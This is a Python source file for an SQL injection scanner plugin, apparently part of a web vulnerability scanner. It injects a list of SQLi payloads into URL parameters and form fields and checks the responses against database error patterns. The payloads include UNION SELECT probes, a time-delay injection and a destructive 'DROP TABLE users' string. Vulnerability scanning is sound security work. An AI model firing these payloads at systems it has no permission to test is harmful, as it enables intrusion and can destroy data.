import logging
import re
from urllib.parse import urlparse, parse_qs, quote
from typing import List, Dict, Optional, Any
from ..http_client import HttpClient
from ..scanner_base import BaseScannerPlugin, ScannerRegistry

logger = logging.getLogger(__name__)

class SQLiScanner(BaseScannerPlugin):
    name = 'sqli_scanner'
    description = 'Scanner for SQL Injection (SQLi) vulnerabilities'
    severity_levels = ['low', 'medium', 'high', 'critical']

    def __init__(self, client=None):
        self.client = client if client else HttpClient()
        self.payloads = [
            "'",
            "' OR '1'='1",
            "' OR 1=1 --",
            '" OR "" = "',
            "') OR ('1'='1--",
            "1; DROP TABLE users--",
            "1' WAITFOR DELAY '0:0:10'--",
            "1 OR 1=1",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
        ]
        self.error_patterns = [
            r"SQL syntax",
            r"MySQL server",
            r"ORA-[0-9]+",
            r"syntax error",
            r"unclosed quotation",
            r"JDBC exception",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Microsoft SQL Native Client error",
            r"OLE DB.*SQL Server",
            r"SQL Server.*Driver"
        ]
    
    async def scan(self, page: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Scan a page for potential SQL Injection vulnerabilities.
        
        Args:
            page (Dict[str, Any]): Page information from crawler
        
        Returns:
            List[Dict[str, Any]]: Detected SQL Injection vulnerabilities
        """
        vulnerabilities = []
        url = page.get('url', '')
        forms = page.get('forms', [])
        
        try:
            # Check URL parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            for param_name, param_values in query_params.items():
                for payload in self.payloads:
                    # Inject payload into parameter
                    modified_params = query_params.copy()
                    modified_params[param_name] = [payload]
                    
                    # Reconstruct URL with injected payload
                    modified_url = parsed_url._replace(
                        query='&'.join(
                            f'{quote(k)}={quote(v[0])}' 
                            for k, v in modified_params.items()
                        )
                    ).geturl()
                    
                    # Send request with injected payload
                    response = await self.client.get(modified_url)
                    
                    # Check for SQL error patterns
                    for pattern in self.error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerabilities.append({
                                'type': 'sql_injection',
                                'url': modified_url,
                                'vulnerable_parameter': param_name,
                                'payload': payload,
                                'severity': 'high',
                                'description': f"SQL injection vulnerability found in parameter '{param_name}'",
                                'location': f"URL parameter: {param_name}"
                            })
                            break
            
            # Check form inputs
            for form in forms:
                for input_field in form.get('inputs', []):
                    field_name = input_field.get('name', '')
                    if not field_name:
                        continue
                        
                    for payload in self.payloads:
                        # Simulate form submission with payload
                        form_data = form.get('data', {}).copy()
                        form_data[field_name] = payload
                        
                        # Send form submission
                        response = await self.client.post(url, data=form_data)
                        
                        # Check for SQL error patterns
                        for pattern in self.error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vulnerabilities.append({
                                    'type': 'sql_injection',
                                    'url': url,
                                    'vulnerable_parameter': field_name,
                                    'payload': payload,
                                    'severity': 'high',
                                    'description': f"SQL injection vulnerability found in form field '{field_name}'",
                                    'location': f"Form field: {field_name}"
                                })
                                break
        except Exception as e:
            logger.error(f"Error during SQLi scan: {e}")
        
        return vulnerabilities

# Manually register the SQLiScanner with the registry
ScannerRegistry.register_scanner(SQLiScanner)
